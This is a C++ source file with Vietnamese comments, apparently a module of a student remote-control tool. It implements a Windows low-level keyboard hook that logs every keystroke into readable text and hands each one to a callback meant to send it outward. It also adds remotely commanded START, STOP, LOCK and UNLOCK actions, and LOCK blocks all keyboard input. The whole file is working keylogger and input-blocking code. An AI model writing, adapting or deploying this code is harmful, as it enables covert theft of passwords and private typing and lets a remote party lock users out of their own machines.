// KeyManager_win.cpp
#include "KeyManager.hpp"
#include <iostream>
#include <vector>

// --- BIẾN TOÀN CỤC (BẮT BUỘC ĐỂ HOOK HOẠT ĐỘNG) ---
static HHOOK g_hHook = NULL;
static KeyCallback g_callback = nullptr; // Hàm callback để gửi dữ liệu ra ngoài
static bool g_isLocked = false; // [MỚI] Biến trạng thái khóa

// --- HÀM TIỆN ÍCH: CHUYỂN ĐỔI VK_CODE SANG STRING (CÓ XỬ LÝ SHIFT/CAPS) ---
static std::string ConvertVKCodeToString(DWORD vkCode) {
    // 1. Xử lý các phím đặc biệt để dễ đọc log
    if (vkCode == VK_RETURN) return "[ENTER]\n";
    if (vkCode == VK_BACK)   return "[BACKSPACE]";
    if (vkCode == VK_TAB)    return "[TAB]";
    if (vkCode == VK_SPACE)  return " ";
    if (vkCode == VK_ESCAPE) return "[ESC]";
    if (vkCode >= VK_F1 && vkCode <= VK_F12) return "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";
    if (vkCode == VK_CAPITAL) return "[CAPS]";
    if (vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) return "[CTRL]";
    if (vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) return "[SHIFT]";
    if (vkCode == VK_LMENU || vkCode == VK_RMENU) return "[ALT]"; // VK_MENU là ALT
    
    // Bỏ qua các phím điều hướng (Arrow keys, Insert, Delete, Home, End, PageUp/Down)
    if ((vkCode >= VK_PRIOR && vkCode <= VK_DOWN) || vkCode == VK_INSERT || vkCode == VK_DELETE) return ""; 

    // 2. Lấy trạng thái bàn phím (để biết có đang bật CapsLock hay giữ Shift không)
    std::vector<BYTE> keyState(256);
    // Cần gọi GetKeyboardState trước để ToUnicodeEx hoạt động chính xác
    if (!GetKeyboardState(keyState.data())) return "";

    // 3. Dùng ToUnicodeEx để chuyển đổi chính xác
    WCHAR buffer[16] = {0};
    HKL keyboardLayout = GetKeyboardLayout(0);

    int result = ToUnicodeEx(
        vkCode,
        MapVirtualKey(vkCode, MAPVK_VK_TO_VSC),
        keyState.data(),
        buffer,
        _countof(buffer),
        0,
        keyboardLayout
    );

    // 4. Nếu chuyển đổi thành công -> Chuyển sang UTF-8 string
    if (result > 0) {
        std::wstring ws(buffer);
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(), NULL, 0, NULL, NULL);
        std::string strTo(size_needed, 0);
        WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(), &strTo[0], size_needed, NULL, NULL);
        return strTo;
    }

    return "";
}

// --- HOOK PROCEDURE (CẬP NHẬT: CHẶN TOÀN DIỆN) ---
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Chỉ xử lý khi nCode >= 0 (theo tài liệu MS)
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = pKeyBoard->vkCode;

        // 1. NẾU ĐANG Ở TRẠNG THÁI KHÓA
        if (g_isLocked) {
            // Kiểm tra xem có phải tổ hợp cứu hộ: CTRL + ALT + U không?
            // (Kiểm tra trạng thái bất đồng bộ của phím vật lý)
            bool isCtrl = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
            bool isAlt  = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;

            // Chỉ check unlock khi có sự kiện nhấn phím (WM_KEYDOWN hoặc WM_SYSKEYDOWN)
            if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
                 if (isCtrl && isAlt && (vk == 'U' || vk == 'u')) {
                    g_isLocked = false;
                    std::cout << "[KEYBOARD] EMERGENCY UNLOCK TRIGGERED!\n";
                    return 1; // Nuốt phím U để không gõ ra màn hình
                }
            }

            // CHẶN TẤT CẢ: Bao gồm KeyDown, KeyUp, SysKeyDown (Alt), SysKeyUp
            // Trả về 1 để Windows không xử lý phím này nữa.
            return 1; 
        }

        // 2. NẾU KHÔNG KHÓA -> CHẠY KEYLOGGER
        // Chỉ log khi nhấn xuống (WM_KEYDOWN) để tránh log kép
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            std::string keyChar = ConvertVKCodeToString(vk);
            if (!keyChar.empty() && g_callback) {
                g_callback(keyChar);
            }
        }
    }
    
    // Chuyển tiếp cho ứng dụng khác nếu không chặn
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}
// --- CÁC HÀM CỦA CLASS ---

void KeyManager::set_callback(KeyCallback cb) {
    g_callback = cb;
}

// [MỚI] Hàm set trạng thái từ Command
void KeyManager::set_locked(bool locked) {
    g_isLocked = locked;
    std::cout << "[KEYBOARD] Lock state: " << (locked ? "LOCKED" : "UNLOCKED") << std::endl;
}

void KeyManager::start_hook() {
    if (g_hHook != NULL) return;
    hookThread = std::thread([]() {
        g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        UnhookWindowsHookEx(g_hHook);
        g_hHook = NULL;
    });
    hookThread.detach();
}

void KeyManager::stop_hook() {
    if (g_hHook) {
        // Gửi message WM_QUIT tới thread hook nếu cần thiết, 
        // hoặc đơn giản là Unhook (tuy nhiên Unhook từ thread khác có thể ko an toàn tuyệt đối nhưng dùng tạm cho đồ án ok)
        UnhookWindowsHookEx(g_hHook);
        g_hHook = NULL;
        g_isLocked = false; // Reset trạng thái khi stop
    }
}

json KeyManager::handle_command(const json& request) {
    std::string command = request.value("command", "");
    
    if (command == "START") {
        start_hook();
        return {{"status", "success"}, {"message", "Keylogger started"}};
    }
    if (command == "STOP") {
        stop_hook();
        return {{"status", "success"}, {"message", "Keylogger stopped"}};
    }
    // [MỚI] LỆNH LOCK / UNLOCK
    if (command == "LOCK") {
        // Phải đảm bảo Hook đã chạy thì mới Lock được
        if (g_hHook == NULL) start_hook(); 
        set_locked(true);
        return {{"status", "success"}, {"message", "Keyboard LOCKED. Press Ctrl+Alt+U to unlock locally."}};
    }
    if (command == "UNLOCK") {
        set_locked(false);
        return {{"status", "success"}, {"message", "Keyboard UNLOCKED"}};
    }

    return {{"status", "error"}, {"message", "Unknown command"}};
}
